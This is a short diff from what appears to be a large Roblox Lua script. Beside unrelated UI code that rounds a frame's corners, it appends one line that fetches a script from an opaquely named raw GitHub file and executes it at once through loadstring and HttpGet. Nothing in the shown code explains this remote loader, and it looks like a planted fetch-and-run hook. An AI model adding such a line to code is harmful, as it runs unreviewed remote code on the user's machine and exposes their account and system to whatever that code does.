@@ -5374,3 +5374,5 @@ if not Corner then
     Corner.CornerRadius = UDim.new(0, 12)
     Corner.Parent = Main
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ylt410/roblox-Script/refs/heads/main/djejhebr"))()
